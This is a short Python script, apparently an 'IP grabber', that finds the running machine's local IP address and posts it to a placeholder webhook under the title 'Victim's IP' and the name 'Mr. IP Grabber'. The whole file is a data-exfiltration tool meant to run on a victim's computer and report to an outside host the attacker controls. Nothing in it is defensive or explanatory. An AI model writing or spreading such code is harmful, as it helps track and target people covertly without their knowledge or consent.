import requests
from urllib.request import Request, urlopen
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))

url = "Your Webhook Here" 
data = {
    "content" : "IP Grabbed Successfully",
    "username" : "Mr. IP Grabber"
}


data["embeds"] = [
    {
        "description" : s.getsockname()[0],
        "title" : "Victim's IP"
    }
]

result = requests.post(url, json = data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print("Payload delivered successfully, code {}.".format(result.status_code))

